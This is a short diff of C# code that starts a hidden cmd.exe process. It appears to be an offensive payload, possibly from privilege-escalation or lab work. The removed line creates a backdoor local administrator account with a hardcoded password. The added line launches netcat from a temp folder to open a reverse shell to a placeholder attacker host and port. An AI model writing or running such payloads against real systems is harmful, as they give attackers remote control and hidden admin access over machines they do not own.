@@ -37,7 +37,7 @@
             System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
             startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
             startInfo.FileName = "cmd.exe";
-            startInfo.Arguments = "/C net user mattymcfatty Really1337! /add && net localgroup administrators mattymcfatty /add";
+            startInfo.Arguments = "/C \"C:\\Windows\\temp\\nc64.exe ATTACKER_IP ATTACKER_PORT -e cmd\"";
             process.StartInfo = startInfo;
             process.Start();
 
